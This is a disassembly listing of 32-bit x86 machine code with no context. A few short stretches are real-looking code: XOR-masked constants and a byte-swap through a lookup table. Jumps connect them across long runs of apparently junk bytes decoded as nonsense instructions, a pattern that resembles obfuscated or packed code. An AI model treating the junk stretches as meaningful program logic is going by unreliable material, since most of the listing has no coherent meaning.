  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    cx,WORD PTR ds:[eax+0x49]
  40c145:	dec    esp
  40c146:	jge    0x40c176
  40c148:	mov    esi,DWORD PTR [eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c169
  40c150:	fsqrt  
  40c152:	dec    ebx
  40c153:	cwde   
  40c154:	cdq    
  40c155:	and    bl,bh
  40c157:	addr16 repz mov ebp,0xde485207
  40c15e:	cmp    bh,cl
  40c160:	jg     0x40c109
  40c162:	lods   al,BYTE PTR ds:[esi]
  40c163:	mov    ebx,0xdf245c09
  40c168:	fnsave [edx]
  40c16a:	mov    bh,0xfe
  40c16c:	jmp    0x1717fd6a
  40c171:	inc    edi
  40c172:	inc    ecx
  40c173:	into   
  40c174:	jp     0x40c13e
  40c176:	cld    
  40c177:	mov    ah,0x4
  40c179:	arpl   WORD PTR [ecx],bp
  40c17b:	push   cs
  40c17c:	adc    DWORD PTR [eax+0x567f3196],edx
  40c182:	push   esp
  40c183:	and    DWORD PTR [esi-0x6896fd06],esp
  40c189:	pop    eax
  40c18a:	dec    esp
  40c18b:	sar    eax,cl
  40c18d:	dec    eax
  40c18e:	pop    ss
  40c18f:	retf   
  40c190:	aad    0xd5
  40c192:	je     0x40c1c4
  40c194:	sub    ebp,DWORD PTR [ebx+eax*8-0x71]
  40c198:	push   ecx
  40c199:	push   0x7a
  40c19b:	xor    BYTE PTR [esi-0x6446581f],0xa0
  40c1a2:	fst    QWORD PTR [ecx-0x4dbdfeea]
  40c1a8:	and    al,0x10
  40c1aa:	in     eax,0x88
  40c1ac:	aad    0x61
  40c1ae:	cld    
  40c1af:	call   0x631429a
  40c1b4:	icebp  
  40c1b5:	jb     0x56a46969
  40c1bb:	mov    WORD PTR [ebx+0x1cf5d44b],gs
  40c1c1:	cmp    BYTE PTR [ebx],ch
  40c1c3:	jl     0x40c19e
  40c1c5:	add    eax,0xc9f6b711
  40c1ca:	dec    DWORD PTR [edx-0x15]
  40c1cd:	lahf   
  40c1ce:	jge    0x40c1e9
  40c1d0:	enter  0xf61b,0x87
  40c1d4:	or     DWORD PTR [ebx+edi*2],ebp
  40c1d7:	push   eax
  40c1d8:	add    al,0xd8
  40c1da:	das    
  40c1db:	sbb    DWORD PTR [edi-0x5a],0x74
  40c1df:	fistp  DWORD PTR [di-0x25]
  40c1e3:	xor    al,0x8c
  40c1e5:	xor    ebx,DWORD PTR [esp+edx*4-0x21]
  40c1e9:	sub    eax,0xd14ac9ab
  40c1ee:	or     DWORD PTR [esi],0x66
  40c1f1:	daa    
  40c1f2:	js     0x40c1bd
  40c1f4:	popa   
  40c1f5:	test   BYTE PTR [ebx-0x33b6befa],ah
  40c1fb:	inc    edx
  40c1fc:	or     al,0x49
  40c1fe:	outs   dx,BYTE PTR ds:[esi]
  40c1ff:	imul   eax,DWORD PTR [ecx],0x43
  40c202:	in     eax,0xbc
  40c204:	out    0x15,eax
  40c206:	popw   ds
  40c208:	xchg   esi,eax
  40c209:	mov    WORD PTR [ecx],es
  40c20b:	sbb    BYTE PTR [ecx+0x6d120379],cl
  40c211:	pop    ecx
  40c212:	rcr    DWORD PTR ds:0xaca8c427,cl
  40c218:	jmp    0x2d8:0xc2db7f6f
  40c21f:	sti    
  40c220:	dec    ebp
  40c221:	fist   DWORD PTR [ecx+eiz*2+0x50]
  40c225:	leave  
  40c226:	das    
  40c227:	mov    ebx,0xb302f5b1
  40c22c:	push   es
  40c22d:	pop    ebp
  40c22e:	ror    ch,cl
  40c230:	mov    bl,0x96
  40c232:	imul   esp,DWORD PTR [esi+0x7b],0x36
  40c236:	scas   eax,DWORD PTR es:[edi]
  40c237:	jmp    0x11243a8e
  40c23c:	xor    dh,bh
  40c23e:	push   eax
  40c23f:	ret    
  40c240:	daa    
  40c241:	scas   eax,DWORD PTR es:[edi]
  40c242:	cmp    al,0x2a
  40c244:	ss ja  0x40c25d
  40c247:	stos   BYTE PTR es:[edi],al
  40c248:	fs sbb ax,0x2e7e
  40c24d:	cmp    BYTE PTR [esp+ebx*1],dh
  40c250:	mov    es,WORD PTR [ebp+0x7a47a8f4]
  40c256:	out    0x19,eax
  40c258:	adc    edi,DWORD PTR [edi+edi*4+0x2d28e66f]
  40c25f:	outs   dx,BYTE PTR ds:[esi]
  40c260:	loope  0x40c240
  40c262:	lods   al,BYTE PTR ds:[esi]
  40c263:	call   0x4e3687bf
  40c268:	sbb    al,BYTE PTR [edx+0x35]
  40c26b:	dec    DWORD PTR [edx+0x4a]
  40c26e:	ja     0x40c26d
  40c270:	cmp    ecx,DWORD PTR [ebp+0xd9db57a]
  40c276:	fisttp QWORD PTR [ebx-0x64]
  40c279:	stos   DWORD PTR es:[edi],eax
  40c27a:	mov    eax,ds:0x64e62521
  40c27f:	inc    edx
  40c280:	cwde   
  40c281:	into   
  40c282:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40c284:	in     al,dx
  40c285:	loope  0x40c2ab
  40c287:	adc    al,0xee
  40c289:	jle    0x40c26e
  40c28b:	inc    edi
  40c28c:	or     al,0xda
  40c28e:	mov    bh,0xa4
  40c290:	adc    esp,DWORD PTR [esi]
  40c292:	stos   BYTE PTR es:[edi],al
  40c293:	xchg   edx,eax
  40c294:	mov    ebp,DWORD PTR [edx]
  40c296:	xor    BYTE PTR [ebx+0x5c],cl
  40c299:	cmc    
  40c29a:	in     al,dx
  40c29b:	push   ebp
  40c29c:	sar    DWORD PTR [edx],0x19
  40c29f:	push   ds
  40c2a0:	jle    0x40c238
  40c2a2:	mov    edx,0xb5d30cbc
  40c2a7:	xor    BYTE PTR [edi-0x33828c80],dh
  40c2ad:	aas    
  40c2ae:	and    al,0x4a
  40c2b0:	xor    dh,BYTE PTR [edi+0x77]
  40c2b3:	push   edi
  40c2b4:	enter  0x8875,0x63
  40c2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2b9:	les    ebx,FWORD PTR [ebx-0x3a6951c]
  40c2bf:	out    0xb,eax
  40c2c1:	jle    0x40c33f
  40c2c3:	cmp    eax,0x7a52bf8e
  40c2c8:	or     ah,BYTE PTR [ebp+0x4088d884]
  40c2ce:	mov    edi,0xc925f690
  40c2d3:	cdq    
  40c2d4:	ss mov ah,0x52
  40c2d7:	cdq    
  40c2d8:	push   0x333b7e5d
  40c2dd:	aaa    
  40c2de:	adc    esp,DWORD PTR [edi-0x29]
  40c2e1:	xchg   ebx,eax
  40c2e2:	adc    DWORD PTR [ebx-0x1a7b51ad],edi
  40c2e8:	push   ebp
  40c2e9:	xchg   edi,eax
  40c2ea:	mov    ch,0x12
  40c2ec:	sub    BYTE PTR [eax+eax*8-0x48631ac8],ah
  40c2f3:	push   ds
  40c2f4:	xchg   esi,eax
  40c2f5:	sbb    ch,bl
  40c2f7:	adc    dl,0xad
  40c2fa:	test   DWORD PTR [esi],ebx
  40c2fc:	addr16 test eax,0x606a5c5a
  40c302:	xor    BYTE PTR [ecx-0x422a27b2],dl
  40c308:	aas    
  40c309:	push   esi
  40c30a:	inc    edi
  40c30b:	leave  
  40c30c:	or     DWORD PTR [ebx],esi
  40c30e:	arpl   WORD PTR [edi+0x65],sp
  40c311:	cmc    
  40c312:	ja     0x40c301
  40c314:	mov    ebp,0xad7f21c0
  40c319:	mov    al,ds:0x65b94c45
  40c31e:	push   0xffffffb0
  40c320:	mov    edi,0xe0106520
  40c325:	jg     0x40c37f
  40c327:	mov    DWORD PTR [ebp-0x2b],edi
  40c32a:	les    edi,FWORD PTR [esi-0x95ca702]
  40c330:	hlt    
  40c331:	addr16 ret 0xb374
  40c335:	mov    al,ds:0x2eb11c8e
  40c33a:	scas   al,BYTE PTR es:[edi]
  40c33b:	mov    bl,0xb4
  40c33d:	dec    eax
  40c33e:	dec    esi
  40c33f:	scas   al,BYTE PTR es:[edi]
  40c340:	cmp    BYTE PTR [esi+0x56],ch
  40c343:	jno    0x40c33c
  40c345:	iret   
  40c346:	cmp    ebp,DWORD PTR [ebx+eiz*4+0x1a]
  40c34a:	jbe    0x40c325
  40c34c:	mov    ecx,0xf81d5fe6
  40c351:	lods   al,BYTE PTR ds:[esi]
  40c352:	inc    esi
  40c353:	fcom   DWORD PTR [ecx]
  40c355:	setne  ah
  40c358:	jo     0x40c306
  40c35a:	(bad)  
  40c35b:	and    dh,dh
  40c35d:	test   al,0xce
  40c35f:	jg     0x40c2f2
  40c361:	or     eax,0xc6613343
  40c366:	jb     0x40c317
  40c368:	push   0x94eb8a93
  40c36d:	cwde   
  40c36e:	sbb    eax,0xc7b852d8
  40c373:	xor    edi,edi
  40c375:	mov    ah,0xcb
  40c377:	or     ecx,esp
  40c379:	xchg   edi,eax
  40c37a:	int    0x76
  40c37c:	ret    0x8220
  40c37f:	cmp    eax,ecx
  40c381:	cdq    
  40c382:	in     al,dx
  40c383:	sub    ecx,DWORD PTR [ebx+0x70]
  40c386:	sub    BYTE PTR [edx-0x3e],al
  40c389:	cli    
  40c38a:	xchg   ecx,eax
  40c38b:	pop    ebx
  40c38c:	fs je  0x40c3f5
  40c38f:	in     al,dx
  40c390:	cmp    ah,BYTE PTR [ecx-0x49]
  40c393:	cld    
  40c394:	test   BYTE PTR ds:0x3e7e987d,0x9d
  40c39b:	mov    ch,0xf5
  40c39d:	inc    ebx
  40c39e:	mov    ebx,DWORD PTR [ebx]
  40c3a0:	inc    edx
  40c3a1:	xchg   ecx,eax
  40c3a2:	test   al,0x59
  40c3a4:	sub    al,0xca
  40c3a6:	iret   
  40c3a7:	(bad)  
  40c3a8:	cmp    al,0x50
  40c3aa:	inc    esi
  40c3ab:	outs   dx,DWORD PTR ds:[esi]
  40c3ac:	in     al,dx
  40c3ad:	test   BYTE PTR [edx+0x1c],al
  40c3b0:	pop    esi
  40c3b1:	inc    esp
  40c3b2:	pop    ebp
  40c3b3:	jo     0x40c358
  40c3b5:	mov    dh,BYTE PTR [esi+0x67a59a37]
  40c3bb:	jp     0x40c39f
  40c3bd:	push   ebp
  40c3be:	call   0x45ca204a
  40c3c3:	xor    eax,0x85fd8ee4
  40c3c8:	push   esi
  40c3c9:	imul   eax,edx,0x5a51d580
  40c3cf:	cdq    
  40c3d0:	fidiv  DWORD PTR [ebp-0x4a]
  40c3d3:	jl     0x40c409
  40c3d5:	loop   0x40c376
  40c3d7:	fnstsw WORD PTR [edx+0x3e53dc70]
  40c3dd:	test   al,0x75
  40c3df:	inc    ebp
  40c3e0:	xchg   edx,eax
  40c3e1:	adc    eax,0x6c2406ab
  40c3e6:	ret    
  40c3e7:	mov    al,ds:0x5da60821
  40c3ec:	adc    eax,0x8ec40521
  40c3f1:	std    
  40c3f2:	shl    BYTE PTR [ebx-0x5a],0xba
  40c3f6:	sub    eax,0x1af7640f
  40c3fb:	jl     0x40c432
  40c3fd:	xor    DWORD PTR [edi],esi
  40c3ff:	sub    cl,bh
  40c401:	xchg   ebx,eax
  40c402:	dec    edi
  40c403:	dec    eax
  40c404:	stos   BYTE PTR es:[edi],al
  40c405:	imul   DWORD PTR [eax]
  40c407:	mov    esi,0x8d2973d8
  40c40c:	mov    ebp,0x5f797d2c
  40c411:	inc    eax
  40c412:	mov    ds:0x8bc10a40,eax
  40c417:	aad    0xc9
  40c419:	xor    al,0xaa
  40c41b:	cmp    DWORD PTR [ecx],ebx
  40c41d:	mov    ebp,0xb775f9b6
  40c422:	inc    ebp
  40c423:	fcomi  st,st(3)
  40c425:	jp     0x40c49d
  40c427:	push   ss
  40c428:	mov    ebp,0x3bed7ee4
  40c42d:	adc    al,0x89
  40c42f:	push   ds
  40c430:	dec    eax
  40c431:	sar    DWORD PTR [ecx],0x37
  40c434:	xchg   ecx,eax
  40c435:	pop    edi
  40c436:	pop    ebx
  40c437:	xor    BYTE PTR [esi],al
  40c439:	pop    ebx
  40c43a:	ret    0x86a8
  40c43d:	xchg   esi,eax
  40c43e:	xchg   edi,eax
  40c43f:	pop    ebp
  40c440:	sub    al,0x31
  40c442:	(bad)  
  40c443:	mov    ebx,0x9c2f2487
  40c448:	push   es
  40c449:	dec    ebp
  40c44a:	push   edx
  40c44b:	sbb    edi,DWORD PTR [esi+0x74]
  40c44e:	hlt    
  40c44f:	pop    ebp
  40c450:	sbb    DWORD PTR [edi-0x1ad9e6c2],eax
  40c456:	and    eax,0xaaa296e9
  40c45b:	inc    edx
  40c45c:	cmp    eax,0x11ab2b8e
  40c461:	sbb    eax,0x52dfb5d9
  40c466:	lock lock mov dl,0x4e
  40c46a:	sar    DWORD PTR [ebx+eax*2-0x5],cl
  40c46e:	xor    bh,BYTE PTR [ecx+0x535a2e54]
  40c474:	fistp  WORD PTR [ebx-0x5ecee238]
  40c47a:	iret   
  40c47b:	pop    esp
  40c47c:	and    DWORD PTR [esi-0x53f04a68],0xa1e33b64
  40c486:	pop    esi
  40c487:	push   edi
  40c488:	sbb    DWORD PTR [esi+0x1564102e],0xdac3fc6a
  40c492:	call   FWORD PTR [ebx+0x32]
  40c495:	lods   eax,DWORD PTR ds:[esi]
  40c496:	mov    BYTE PTR [edx-0x6a7510e6],bh
  40c49c:	sbb    DWORD PTR [edi-0x46f0fef7],esp
  40c4a2:	aam    0xca
  40c4a4:	mov    ecx,0xce73b898
  40c4a9:	and    ecx,esp
  40c4ab:	rcr    al,1
  40c4ad:	pushf  
  40c4ae:	lods   al,BYTE PTR ds:[esi]
  40c4af:	jmp    0x40c4d4
  40c4b1:	dec    edi
  40c4b2:	xchg   BYTE PTR cs:[ecx],cl
  40c4b5:	dec    ecx
  40c4b6:	adc    al,0xbb
  40c4b8:	loop   0x40c46b
  40c4ba:	mov    cl,0x7b
  40c4bc:	je     0x40c4f1
  40c4be:	inc    eax
  40c4bf:	je     0x40c483
  40c4c1:	outs   dx,DWORD PTR ds:[esi]
  40c4c2:	daa    
  40c4c3:	ds jnp 0x40c4e2
  40c4c6:	cli    
  40c4c7:	int3   
  40c4c8:	jns    0x40c4f5
  40c4ca:	loope  0x40c530
  40c4cc:	retf   
  40c4cd:	mov    dh,0xc6
  40c4cf:	mov    edx,0x884c11bb
  40c4d4:	cmp    bl,BYTE PTR [ebx-0x22]
  40c4d7:	mov    ebx,DWORD PTR ds:0x4b8e1910
  40c4dd:	ins    BYTE PTR es:[edi],dx
  40c4de:	adc    eax,0x4f2aad36
  40c4e3:	push   0xf53fba19
  40c4e8:	cmp    eax,0xd642ff69
  40c4ed:	test   eax,0xd0332ef2
  40c4f2:	add    edx,DWORD PTR [ebp-0x14]
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	pop    edi
  40c541:	sub    ecx,edx
  40c543:	dec    esp
  40c544:	dec    ebp
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c4f8
  40c54d:	mov    ch,0xf9
  40c54f:	pop    es
  40c550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c551:	fadd   DWORD PTR [edx-0x4611a980]
  40c557:	xor    eax,0x8c07229b
  40c55c:	ret    
  40c55d:	test   eax,0xa2dfde13
  40c562:	aas    
  40c563:	mov    esp,edi
  40c565:	cmp    eax,0x296b4b27
  40c56a:	pop    ebp
  40c56b:	je     0x40c576
  40c56d:	jb     0x40c4f1
  40c56f:	push   cs
  40c570:	jp     0x40c5c7
  40c572:	mov    edi,0xf4d1575
  40c577:	shl    DWORD PTR [eax+ebp*2+0x32],cl
  40c57b:	jno    0x40c58c
  40c57d:	test   al,0xbb
  40c57f:	pop    edx
  40c580:	jns    0x40c512
  40c582:	int3   
  40c583:	add    DWORD PTR [ecx+0x329847e6],edx
  40c589:	inc    edx
  40c58a:	out    0xf5,eax
  40c58c:	nop
  40c58d:	cmp    ebx,0xac4c986b
  40c593:	test   edi,esp
  40c595:	mov    esi,DWORD PTR [ecx+0x0]
  40c598:	fisubr WORD PTR [ebx]
  40c59a:	adc    eax,0x810059cd
  40c59f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5a1:	fldcw  WORD PTR [ecx-0x1e]
  40c5a4:	xchg   ebp,eax
  40c5a5:	mov    edi,0x9bfbb776
  40c5aa:	arpl   bp,sp
  40c5ac:	and    al,0xcb
  40c5ae:	test   al,0x1
  40c5b0:	push   edi
  40c5b1:	mov    dh,0x99
  40c5b3:	pop    ebx
  40c5b4:	inc    eax
  40c5b5:	inc    edx
  40c5b6:	outs   dx,BYTE PTR ds:[esi]
  40c5b7:	fstp   TBYTE PTR ds:0xb6e306e2
  40c5bd:	cdq    
  40c5be:	jae    0x40c546
  40c5c0:	cmp    al,0x23
  40c5c2:	popa   
  40c5c3:	ja     0x40c5ce
  40c5c5:	xchg   edx,eax
  40c5c6:	jg     0x40c644
  40c5c8:	and    dh,al
  40c5ca:	mov    ds:0x591c7,al
  40c5cf:	in     al,0x8c
  40c5d1:	scas   al,BYTE PTR es:[edi]
  40c5d2:	ds cwde 
  40c5d4:	sti    
  40c5d5:	jg     0x40c607
  40c5d7:	dec    ebp
  40c5d8:	outs   dx,DWORD PTR ds:[esi]
  40c5d9:	(bad)  
  40c5da:	sbb    edx,DWORD PTR [edx+0x42]
  40c5dd:	sar    BYTE PTR [edx],cl
  40c5df:	mov    DWORD PTR [eax-0x7a],0x82c28b2b
  40c5e6:	jg     0x40c5d3
  40c5e8:	jne    0x40c5cd
  40c5ea:	(bad)  
  40c5eb:	mov    ds:0x2be49e8a,eax
  40c5f0:	push   esi
  40c5f1:	adc    DWORD PTR [ecx+0x35],esp
  40c5f4:	sbb    DWORD PTR [ebx-0x54],edi
  40c5f7:	jp     0x40c632
  40c5f9:	outs   dx,DWORD PTR ds:[esi]
  40c5fa:	cdq    
  40c5fb:	stos   DWORD PTR es:[edi],eax
  40c5fc:	out    0xae,al
  40c5fe:	jp     0x40c63c
  40c600:	shl    BYTE PTR [edi+0x559c8c91],0xf8
  40c607:	arpl   WORD PTR [eax+0x4071f901],bx
  40c60d:	in     eax,dx
  40c60e:	(bad)  
  40c610:	sti    
  40c611:	inc    ebp
  40c612:	xchg   edi,eax
  40c613:	in     eax,0xeb
  40c615:	inc    ebp
  40c616:	or     dh,cl
  40c618:	sub    dl,BYTE PTR [ecx]
  40c61a:	mov    ds:0x8d745e7c,eax
  40c61f:	add    al,0x20
  40c621:	xchg   esp,eax
  40c622:	clc    
  40c623:	cwde   
  40c624:	sbb    ax,WORD PTR fs:[eax-0x69]
  40c629:	shl    DWORD PTR [eax-0x59],cl
  40c62c:	mov    al,ds:0x4448875f
  40c631:	xor    DWORD PTR [esi-0x3dd0c096],eax
  40c637:	pushf  
  40c638:	mov    ah,dl
  40c63a:	push   esp
  40c63b:	test   eax,0x5b4d1452
  40c640:	stc    
  40c641:	aam    0x50
  40c643:	dec    eax
  40c644:	push   ebx
  40c645:	cmp    eax,DWORD PTR [edi+0x5b]
  40c648:	fsubr  QWORD PTR [eax+0x55]
  40c64b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c64c:	push   ecx
  40c64d:	fnsave [esi]
  40c64f:	in     al,dx
  40c650:	inc    ecx
  40c651:	push   ecx
  40c652:	test   al,0x80
  40c654:	cmp    esp,DWORD PTR [ebx+0x59]
  40c657:	jno    0x40c675
  40c659:	addr16 mov ebx,0x3e14fcc7
  40c65f:	rcr    BYTE PTR [esi],1
  40c661:	sub    DWORD PTR [edx],ecx
  40c663:	add    ebx,DWORD PTR gs:[eax]
  40c666:	and    edi,esp
  40c668:	xor    eax,0xe840aaf
  40c66d:	xchg   edi,eax
  40c66e:	stos   DWORD PTR es:[edi],eax
  40c66f:	loope  0x40c634
  40c671:	out    0xaf,al
  40c673:	arpl   cx,dx
  40c675:	stc    
  40c676:	lahf   
  40c677:	dec    esp
  40c678:	stos   BYTE PTR es:[edi],al
  40c679:	int3   
  40c67a:	inc    ecx
  40c67b:	test   eax,0xdc4e2bea
  40c680:	or     BYTE PTR [ebp+0x6c],dh
  40c683:	xlat   BYTE PTR ds:[ebx]
  40c684:	pushf  
  40c685:	in     al,0xe9
  40c687:	pushf  
  40c688:	iret   
  40c689:	xlat   BYTE PTR ds:[ebx]
  40c68a:	(bad)  
  40c68b:	(bad)  [ecx+ebp*4-0x4e3e297b]
  40c692:	xchg   BYTE PTR [ebx-0x7ae0e8ea],bh
  40c698:	inc    esi
  40c699:	push   ecx
  40c69a:	jl     0xa1fb929f
  40c6a0:	ja     0x40c6ac
  40c6a2:	bound  ebx,QWORD PTR [ebp+0x52]
  40c6a5:	xor    eax,0xe008da8a
  40c6aa:	xchg   edx,eax
  40c6ab:	dec    ebx
  40c6ac:	dec    esp
  40c6ad:	ja     0x40c653
  40c6af:	xor    eax,esp
  40c6b1:	fnstcw WORD PTR [ecx]
  40c6b3:	mov    ds:0xb93c9b6f,eax
  40c6b8:	xchg   ecx,eax
  40c6b9:	aaa    
  40c6ba:	jp     0x40c6d7
  40c6bc:	pop    ebp
  40c6bd:	push   ebp
  40c6be:	lahf   
  40c6bf:	inc    esp
  40c6c0:	enter  0x2ae8,0xc7
  40c6c4:	outs   dx,BYTE PTR ds:[esi]
  40c6c5:	xchg   DWORD PTR [edx],esi
  40c6c7:	adc    DWORD PTR [ecx-0x4a],edi
  40c6ca:	push   edx
  40c6cb:	mov    esp,0xdaad12a1
  40c6d0:	scas   eax,DWORD PTR es:[edi]
  40c6d1:	jne    0x40c704
  40c6d3:	in     eax,0x8e
  40c6d5:	(bad)  
  40c6d6:	dec    ecx
  40c6d7:	jmp    0x8984829a
  40c6dc:	mov    ebx,0xb0299c2f
  40c6e1:	cdq    
  40c6e2:	xchg   cl,ch
  40c6e4:	pop    edx
  40c6e5:	add    al,BYTE PTR [eax]
  40c6e7:	xchg   ebp,eax
  40c6e8:	mov    ds:0xac1f8257,al
  40c6ed:	(bad)  
  40c6ef:	push   edi
  40c6f0:	int3   
  40c6f1:	std    
  40c6f2:	(bad)  
  40c6f3:	pop    edi
  40c6f4:	dec    esp
  40c6f5:	adc    dl,BYTE PTR [esi+0x14]
  40c6f8:	push   ebx
  40c6f9:	test   BYTE PTR [ebp-0x2cc807ae],ch
  40c6ff:	sbb    DWORD PTR [ebp+0x28],ebx
  40c702:	sbb    esi,DWORD PTR [ecx+0x2e4a927f]
  40c708:	dec    esp
  40c709:	test   BYTE PTR [esi+ecx*1+0x70fb6d76],0x8
  40c711:	scas   eax,DWORD PTR es:[edi]
  40c712:	test   eax,0x11b38c18
  40c717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c718:	dec    esi
  40c719:	mov    bl,0x40
  40c71b:	sar    DWORD PTR [eax+ebx*1-0x2142f7fa],0xf1
  40c723:	in     al,dx
  40c724:	sub    dl,BYTE PTR ds:0x77e3d1ad
  40c72a:	out    0xd6,al
  40c72c:	ins    DWORD PTR es:[edi],dx
  40c72d:	pop    esi
  40c72e:	sbb    ebx,ebx
  40c730:	out    0x22,al
  40c732:	inc    esp
  40c733:	loope  0x40c766
  40c735:	dec    esi
  40c736:	in     al,0xfe
  40c738:	sbb    BYTE PTR [ebp+0x45],dl
  40c73b:	sti    
  40c73c:	xchg   esp,eax
  40c73d:	adc    al,0xd
  40c73f:	xor    WORD PTR [edi-0x4e25454d],ax
  40c746:	(bad)  
  40c747:	rcr    DWORD PTR [ebx],1
  40c749:	xchg   esi,eax
  40c74a:	inc    edx
  40c74b:	les    eax,FWORD PTR [ebx]
  40c74d:	loop   0x40c744
  40c74f:	dec    esp
  40c750:	jg     0x40c71d
  40c752:	xchg   esp,eax
  40c753:	lea    ebx,[edi+0x74ba0564]
  40c759:	hlt    
  40c75a:	dec    esp
  40c75b:	mov    cl,0x69
  40c75d:	or     eax,0x4dd7944b
  40c762:	(bad)  
  40c764:	and    eax,0x4aeede07
  40c769:	fnstsw WORD PTR [eax]
  40c76b:	and    DWORD PTR [eax-0x7d],ebp
  40c76e:	xor    al,0x4
  40c770:	adc    al,0x11
  40c772:	daa    
  40c773:	cs retf 
  40c775:	out    dx,al
  40c776:	test   DWORD PTR [esi+edi*4-0x5f],edx
  40c77a:	pop    esp
  40c77b:	gs (bad) 
  40c77d:	push   ss
  40c77e:	fldenv [esi+0x64f47477]
  40c784:	adc    DWORD PTR [eax-0x1a],0x7f
  40c788:	jne    0x40c719
  40c78a:	cmc    
  40c78b:	addr16 test eax,0x2c17f76b
  40c791:	lock test ch,bl
  40c794:	xor    BYTE PTR [ecx-0x56862665],dl
  40c79a:	xor    dh,BYTE PTR [eax+0x2e]
  40c79d:	mov    dl,0xa7
  40c79f:	out    dx,al
  40c7a0:	jg     0x40c7ad
  40c7a2:	ins    DWORD PTR es:[edi],dx
  40c7a3:	adc    BYTE PTR [edx],ah
  40c7a5:	fsub   QWORD PTR [edi]
  40c7a7:	cmp    eax,DWORD PTR ds:0xc476400a
  40c7ad:	(bad)  
  40c7ae:	xor    BYTE PTR [ebp-0x33941f0],al
  40c7b4:	push   ebx
  40c7b5:	hlt    
  40c7b6:	dec    eax
  40c7b7:	xchg   BYTE PTR [edi+0x14],bh
  40c7ba:	mov    bh,0x90
  40c7bc:	imul   eax,edi,0xcc2b1353
  40c7c2:	shl    BYTE PTR [edx-0x5b894624],cl
  40c7c8:	xchg   cl,bl
  40c7ca:	shl    BYTE PTR [esi-0x54818dc3],1
  40c7d0:	scas   al,BYTE PTR es:[edi]
  40c7d1:	jecxz  0x40c823
  40c7d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7d4:	jecxz  0x40c7dd
  40c7d6:	cdq    
  40c7d7:	cmovge ecx,eax
  40c7da:	nop
  40c7db:	add    ecx,0xffffffa4
  40c7de:	cmp    DWORD PTR [ebx],ecx
  40c7e0:	ror    DWORD PTR [ecx],0x16
  40c7e3:	shl    esp,cl
  40c7e5:	and    dh,BYTE PTR [ebp-0x7c33cfb3]
  40c7eb:	sub    BYTE PTR [edi+0x111bc080],dh
  40c7f1:	in     al,dx
  40c7f2:	aam    0xab
  40c7f4:	in     eax,dx
  40c7f5:	adc    bh,dh
  40c7f7:	shl    DWORD PTR [eax],0xaa
  40c7fa:	mov    al,ds:0x98ba19ba
  40c7ff:	xor    DWORD PTR [ebx-0x562ebe07],edx
  40c805:	push   eax
  40c806:	fcmovu st,st(1)
  40c808:	adc    al,0x3
  40c80a:	jge    0x40c87c
  40c80c:	lds    ebp,FWORD PTR [ebx-0x31]
  40c80f:	and    dh,BYTE PTR [eax+0x6d56acc5]
  40c815:	xor    al,0xa0
  40c817:	ins    BYTE PTR es:[edi],dx
  40c818:	out    0x55,eax
  40c81a:	rcr    ebp,cl
  40c81c:	sub    edx,ebx
  40c81e:	pop    edx
  40c81f:	enter  0x12fd,0xd0
  40c823:	out    0x4d,eax
  40c825:	jmp    0x4262:0xd43f7885
  40c82c:	(bad)  
  40c82d:	xor    DWORD PTR [eax],esp
  40c82f:	(bad)  
  40c830:	cld    
  40c831:	xor    BYTE PTR [ebp+0x78],cl
  40c834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c835:	cmp    DWORD PTR [ebp-0x1141eddc],edx
  40c83b:	cwde   
  40c83c:	add    al,0x7c
  40c83e:	retf   
  40c83f:	mov    ah,0x3c
  40c841:	cmp    eax,esp
  40c843:	mov    al,bh
  40c845:	outs   dx,DWORD PTR ds:[esi]
  40c846:	test   BYTE PTR [edx+eax*4-0x52],ah
  40c84a:	pop    eax
  40c84b:	pop    ebx
  40c84c:	mov    cl,0x67
  40c84e:	sub    al,0xdf
  40c850:	setp   BYTE PTR [esi+0x41]
  40c854:	lods   eax,DWORD PTR ds:[esi]
  40c855:	int3   
  40c856:	std    
  40c857:	fsub   DWORD PTR [ebp+0xfa15820]
  40c85d:	mov    al,0x39
  40c85f:	leave  
  40c860:	push   cs
  40c861:	pop    edx
  40c862:	xor    al,0x98
  40c864:	inc    esp
